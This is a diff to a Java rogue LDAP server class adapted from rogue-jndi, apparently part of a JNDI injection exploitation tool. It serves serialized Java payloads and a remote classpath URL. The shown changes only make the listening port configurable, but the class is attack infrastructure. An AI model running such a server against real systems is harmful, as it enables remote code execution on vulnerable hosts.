@@ -22,7 +22,7 @@ import java.net.InetAddress;
 public class LDAPServer extends InMemoryOperationInterceptor {
 
 
-    public String host = "http://" + Main.address + ":" + Main.port + "/";
+    public static int ldapServerPort = 10389;
 
 
     public static PayloadVector payloadVector = PayloadVector.JavaSerializationObject;
@@ -30,18 +30,20 @@ public class LDAPServer extends InMemoryOperationInterceptor {
     public static void main(String[] args) throws ClassNotFoundException {
         LDAPTest.main(args);
     }
+    
+    public String host = "http://" + Main.address + ":" + Main.remoteHttpPort + "/";
 
     //stolen from here, i can't read com.unboundid.ldap documentation
     //https://github.com/veracode-research/rogue-jndi/blob/master/src/main/java/artsploit/LdapServer.java
     public void start() throws Exception {
+        ldapServerPort = Integer.parseInt(System.getProperty("ldap.port", ldapServerPort + ""));
         System.out.println("Payload Vector: " + payloadVector);
-        System.out.println("Starting LDAP server on 0.0.0.0:1389");
+        System.out.println("Starting LDAP server on 0.0.0.0:" + ldapServerPort);
         System.out.println("Classpath URL: " + host);
         InMemoryDirectoryServerConfig inMemoryOperationInterceptor = new InMemoryDirectoryServerConfig("dc=example,dc=com");
-        inMemoryOperationInterceptor.setListenerConfigs(new InMemoryListenerConfig(
-                "listen",
+        inMemoryOperationInterceptor.setListenerConfigs(new InMemoryListenerConfig("listen",
                 InetAddress.getByName("0.0.0.0"),
-                1389,
+                ldapServerPort,
                 ServerSocketFactory.getDefault(),
                 SocketFactory.getDefault(),
                 (SSLSocketFactory) SSLSocketFactory.getDefault()));
